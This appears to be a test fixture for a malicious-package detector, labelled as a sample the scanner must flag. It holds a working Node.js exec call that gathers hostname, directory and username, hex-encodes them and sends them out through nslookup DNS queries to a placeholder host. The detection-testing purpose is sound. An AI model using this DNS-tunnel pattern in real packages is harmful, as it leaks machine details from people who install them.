// Fixture: install-time recon exfiltrated through an nslookup DNS loop.
// Must convict the nslookup DNS-tunnel hostile (shell-string nslookup
// with a variable label, hex-encoded bundle, child_process exec).
const { exec } = require("child_process");
exec("a=$(hostname;pwd;whoami;echo 'fixture-package') && echo $a | xxd -p | head | while read ut;do nslookup $ut.example-oast.invalid;done", (error, data) => {
	if (error) {
		console.log("error", error.message);
		return;
	}
	console.log(data);
});
